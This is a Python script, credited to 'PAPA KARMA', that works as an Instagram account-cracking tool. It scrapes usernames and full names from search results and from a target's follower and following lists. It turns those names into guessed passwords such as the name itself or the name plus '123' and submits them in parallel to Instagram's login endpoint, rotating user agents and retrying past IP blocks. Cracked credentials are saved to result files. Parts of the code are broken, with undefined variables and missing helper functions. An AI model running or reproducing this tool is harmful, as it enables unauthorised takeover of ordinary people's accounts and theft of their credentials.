#CODED BY PAPA KARMA
try:
	import json
	import uuid
	import hmac
	import random
	import hashlib
	import urllib
	import stdiomask
	import urllib.request
except ImportError as e:
	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser

day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10

insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
try:
	os.mkdir('result')
except:
	pass
#COLOR
CY='\033[96;1m'
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR

#USER AGENT
USN="Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
s=requests.Session()


try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus
 

def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://www.instagram.com/%s/?__a=1"%(user),cookies={'cookie':cookie},headers={"user-agent":USN})
        i=c.json()["graphql"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        wel='# Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.cookies.log')
        os.remove('.username')
        os.system('python instagram.py')

    return external,user
#cookie
def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.cookies.log','r').read()
        except FileNotFoundError:

            wel = 'LOGIN METHOD'
            wel2 = mark(wel, style='red')
            sol().print(wel2)
            io = '[1] LOGIN USING COOKIE\n[2] LOGIN USING USERNAME'
            oi = nel(io, style='red')
            cetak(nel(oi, title='LOGIN METHOD'))
            loginpil=input(f"[➣] INPUT OPTION:{C} ")
            if loginpil=='1':
                wel = 'CREATE NEW IG ACCOUNT TO LOGIN'
                wel2 = mark(wel, style='red')
                sol().print(wel2)
                us=input(f'{CY}  [➣] IG USERNAME :{C}')
                cok=input(f'{CY} [➣] IG PASSWORD :{C}')
                kuki=open('.cookies.log','w').write(cok)
                user=open('.username','w').write(us)
                os.system('python instagram.py')
            elif loginpil == '2':
                login()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        login()


def login():
	global external
	try:
		wel = '# Use Instagram username and password to login. before logging in make sure the account is public not private'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		us=input(f"{CY}[•] Input username: {C}")
		pw=stdiomask.getpass(prompt=f'{CY}[•] Input password: {C}')
	except KeyboardInterrupt:
		wel = '# KeyboardInterrupt detected... exit !'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		exit()
	x=instagram(us,pw).loginAPI()
	if x.get('status')=='success':
		open('.username','a').write(us)
		open('.kukis.log','a').write(x.get('cookie'))
		cookie={'cookie':x.get('cookie')}
		print(f'\n{H}>{C} Login succeed')
		os.system('python login.py')
	elif x.get('status')=='checkpoint':
		wel = '# Login checkpoint'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		login()
	else:
		wel = '# The username or password you entered is wrong'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		login()



class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
	def logo(self):
		os.system('clear')
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			print(f"""{C}
##    ##    ###    ########  ##     ##    ###    
##   ##    ## ##   ##     ## ###   ###   ## ##   
##  ##    ##   ##  ##     ## #### ####  ##   ##  
#####    ##     ## ########  ## ### ## ##     ## 
##  ##   ######### ##   ##   ##     ## ######### 
##   ##  ##     ## ##    ##  ##     ## ##     ## 
##    ## ##     ## ##     ## ##     ## ##     ## 

 ╔══════════════════════════════════════════╗
 AUTHOR   {H}• Karma David
 GITHUB   {H}• https://github.com/Karma-Kh3n
 FB       {H}• https://me.fb/Karma428
 ╚══════════════════════════════════════════╝{C}
[{H}•{C}]WELCOME          {H}•{nama}
[{H}•{C}]USERNAME         {H}•{self.username}
[{H}•{C}]FOLLOWERS        {H}•{followers}
[{H}•{C}]FOLLLOWING       {H}•{following} 
  \x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m
[01] PUBLIC ID SEARCH
[02] CRACK FROM FOLLOWERS
[03] CRACK FROM FOLLOWING {H}•[✓]
[•E] EXIT
	""")


	def BUG(self):
		bug=f'[•] Help me develop this script. any bugs please report them to me, the less bugs the better the script'
		bug1 = nel(bug, style='red')
		cetak(nel(bug1, title='REPORT BUG'))
		exit()

	def ChangeLog(self):
		io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
		oi = nel(io, style='red')
		cetak(nel(oi, title='Fitur yang di update'))

		io='[1] Bot unfollow instagram\n[2] Bot spam komen'
		oi = nel(io, style='red')
		cetak(nel(oi, title='Fitur tambahan'))

		io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
		oi = nel(io, style='red')
		cetak(nel(oi, title='Fix Bug'))
		exit()

	def Exit(self):
		kel='# Apakah anda yakin ingin keluar ?'
		kel1=mark(kel,style='red')
		sol().print(kel1)
		x=input(f'\n{CY}[•] Answer [y/t] : {C}')
		if x in ('y','Y'):
			os.remove('.cookies.log')
			os.remove('.username')
			os.system('python instagram.py')
		elif x in ('t','T'):
			os.system('python instagram.py')
		else:
			self.Exit()

	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=generateUUID(True)
		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})

		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


	def searchAPI(self,cookie,nama):
		try:
			x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				user=i['user']
				username=user['username']
				fullname=user['full_name']
				internal.append(f'{username}|{fullname}')
		except requests.exceptions.ConnectionError:
			exit(f'\n [{M}!{C}] Internet connection problem')
		return internal

	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get('https://www.instagram.com/%s/?__a=1'%(id),cookies=cookie,headers={"user-agent":USN})
				m_jason=m.json()["graphql"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				exit(f"\n{M}[!] Internet connection problem{C}")
			except Exception as e:
				exit(f"\n{M}[!] The username you entered was not found, make sure the target is public{C}")
			return idx
		else:lisensi()

	def infoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				idtar=f'# [•] WAIT COLLECTING ID [•]'
				idtar1=mark(idtar,style='yellow')
				sol().print(idtar1)
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				exit(f'\n{M}[!] Internet connection problem{C}')
			except Exception as e:
				print(f'\n{M}[!] The username you entered was not found{C}')
			return internal
		else:lisensi()

	def passwordAPI(self,xnx):
		print(f'\n {C}{M} Total Username {C}{len(internal)}{C}')
		print('\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m')
		print(f"""
 [?] KARMA CRACKING METHOD [?]

 [1]. KARMA PRO    [✓]
 [2]. KARMA MBASIC [✓✓]
 [3]. KARMA MOBILE [✓✓✓✓]
		""")
		print('\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m')
		print(f"""
 [{M}✓{M}] OK RESULTS SAVED TO: result/{day}.txt
 [{M}X{M}] CP RESULTS SAVED TO: result/{day}.txt
\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m
 [{M}!{M}] USE FIGHT MODE FOR 2SEC
		""")
		with ThreadPoolExecutor(max_workers=30) as shinkai:
			for i in user:
				try:
					username=i.split("|")[0]
					password=i.split("|")[1].lower()
					for w in password.split(" "):
						if len(w)<3:
							continue
						else:
							w=w.lower()
							if o=="1":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w+'123']
								else:
									sandi=[w]
							elif o=="2":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w+'123',w]
								else:
									sandi=[w+'123',w]
							elif o=="3":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w+'123',w,password.lower()]
								else:
									sandi=[w+'123',w,password.lower()]
							shinkai.submit(self.crackAPI,username,sandi)
				except:
					pass
		print('\n')
		oi='# CRACK COMPLETE'
		io=mark(oi,style='red')
		sol().print(io)
		exit()

	def APIinfo(self,user):
		try:
			x=s.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN})
			x_jason=x.json()["graphql"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			pass

		return nama,pengikut,mengikut,postingan

	def crackAPI(self,user,pas):
		global loop,success,checkpoint
		sys.stdout.write(f"\r ❣️ [{K}{loop}/{len(internal)}{C}] {H}OK: - {len(success)}{C}  {M}CP: - 0{C} "),
		sys.stdout.flush()
		try:
			for pw in pas:

				uaku=random.choice(ugen)
				token=s.get('https://www.instagram.com/accounts/login/?next=/accounts/logout/')
				headers = {
					'Host': 'www.instagram.com',
					'content-length': '319',
					'x-ig-app-id': '1217981644879628',
					'x-ig-www-claim': '0',
					'sec-ch-ua-mobile': '?1',
					'x-instagram-ajax': '91a9763f5eb6',
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*',
					'x-requested-with': 'XMLHttpRequest',
					'x-asbd-id': '198387',
					'user-agent': uaku,
					'x-csrftoken': token.cookies['csrftoken'],
					'origin': 'https://www.instagram.com',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'referer': 'https://www.instagram.com/',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
				}

				param={
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
					"username": user,
					"optIntoOneTap": 'false',
					"queryParams": "{}",
					"stopDeletionNonce": "",
					"trustedDeviceRecords": "{}"}
				x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param)
				x_jason=json.loads(x.text)
				if "userId" in str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
					oi = nel(io, style='green')
					print('\n')
					cetak(nel(oi, title='HEDI-OK'))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break

				elif 'checkpoint_url' in str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
					print('\n')
					oi=nel(io,style='red')
					cetak(nel(oi, title='HEDI-CP'))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break

				elif 'Please wait a few minutes' in str(x.text):
					sys.stdout.write(f"\r{H}{H} {H}{H}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
				elif 'ip_block' in str(x.text):
					sys.stdout.write(f"\r{H}{H} {H}{H}");sys.stdout.flush();sleep(0)
					self.crackAPI(user,pas)
				elif 'spam' in str(x.text):
					sys.stdout.write(f"\r{H}!{H} {H}Ip{H}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)

				else:
					continue

			loop+=1
		except:
			self.crackAPI(user,pas)

	def checkAPI(self,user,pw):
		try:
			token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
			s.headers.update({
				'authority': 'www.instagram.com',
				'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
				'x-instagram-ajax': '82a581bb9399',
				'content-type': 'application/x-www-form-urlencoded',
				'accept': '*/*',
				'user-agent': user_agent(),
				'x-requested-with': 'XMLHttpRequest',
				'x-csrftoken': crf_token,
				'x-ig-app-id': '936619743392459',
				'origin': 'https://www.instagram.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://www.instagram.com/',
				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
			})

			param={
				"username": user,
				"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
				"optIntoOneTap": False,
				"queryParams": {},
				"stopDeletionNonce": "",
				"trustedDeviceRecords": {}
			}
			x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
			x_jason=json.loads(x.text)
			if "userId" in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
				oi = nel(io, style='green')
				print('\n')
				cetak(nel(oi, title='HEDI-OK'))

			elif 'checkpoint_url' in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
				oi = nel(io, style='red')
				print('\n')
				cetak(nel(oi, title='HEDI-CP'))

			elif 'Please wait a few minutes' in str(x.text):
				sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
				self.checkAPI(user,pw)
		except:
			self.checkAPI(user,pw)

#-------------------[ MAIN-MENU ]----------------------#

	def menu(self):
		self.logo()
		c=input(f' {M}[KARMA] :{M}  ')
		if c=='':
			self.menu()
		elif c in ('1','01'):
			mas='# Enter target amount'
			mas1=mark(mas,style='green')
			sol().print(mas1)
			m=int(input(f'\n{CY}[•] Amount : {C}'));print('')
			mas='# Enter the name of the ranfom for searching'
			mas1=mark(mas,style='green')
			sol().print(mas1)
			for i in range(m):
				i+1
				nama=input(f'{CY}[>] Enter name ({H}{len(internal)}{C}): ')
				name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)

		elif c in ('2','02'):
			menudump.append('follower')
			mas='# Id NoT Public'
			mas1=mark(mas,style='red')
			sol().print(mas1)
			m=input(f'{CY}[•] USER NAME: {C}')

			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100',id)
			self.passwordAPI(info)

		elif c in ('3','03'):
			mas='# Target must be public, not private'
			mas1=mark(mas,style='red')
			sol().print(mas1)
			m=input(f'{CY}[•] USERNAME: {C}')

			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.passwordAPI(info)


		elif c in ('4','04'):
			print('')
			for i in os.listdir('result'):
				print(f' [{U}>{C}] {i}')
			c=input(f'\n {CY}>>> Input name file: {C}')
			g=open("result/%s"%(c)).read().splitlines()
			print(f'\n{CY}[+] Total Result MASTER_FU{H}{len(g)}{C}')
			print(f'\n{CY}[!] The process of checking account status. Please wait a moment{C}\n')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			exit(f'\n\n{K}[#] check process complete...{C}')

		elif c in ('5','05'):
			print('')
			for i in os.listdir('result'):
				print(f' [{U}>{C}] {i}')
			c=input(f'\n {U}>>> Input nama file: {C}')
			g=open("result/%s"%(c)).read().splitlines()
			xx=c.split("-")
			xc=xx[0]
			print(f'\n{K}[>] The total results found [{H}{len(g)}{C}]')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				fol=s.split("|")[2]
				ful=s.split("|")[3]
				if xc=="checkpoint":
					print(f"""
 [{M}+{C}] {M}HEDI-CP{C}:
  {M}|{C}
  {M}├╴>{C} Username: {O}{usr}{C}
  {M}├╴>{C} Password: {O}{pwd}{C}
  {M}├╴>{C} Followers: {O}{fol}{C}
  {M}├╴>{C} Following: {O}{ful}{C}
					""");sleep(0.05)
				else:
					print(f"""
  {H}[>]{C}{H} STATUS : HEDI-OK {C}
  {H}[>]{C}{H} Username : {H}{usr}{C}
  {H}[>]{C}{H} Password : {H}{pwd}{C}
  {H}[>]{C}{H} Pengikut : {H}{fol}{C}
  {H}[>]{C}{H} Mengikuti : {H}{ful}{C}
					""");sleep(0.05)
		elif c in ('6','06'):
			global following
			six=0
			print(f'\n [{U}!{C}] Unfollow-All Bot Run\n')
			x=open('.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			input(f'\n\n [{U}#{C}] Unfollow-all done..');self.menu()

		elif c in ('r','R'):
			self.BUG()
		elif c in ('c','C'):
			self.ChangeLog()
		elif c in ('e','E'):
			self.Exit()

		else:
			self.menu()

#--------------------[ SISTEM-CONTROL ]-------------------------#

if __name__=='__main__':
	try:
		login_kamu()
	except requests.exceptions.ConnectionError:
		exit(f'\n [{M}!{C}] Internet connection problem')
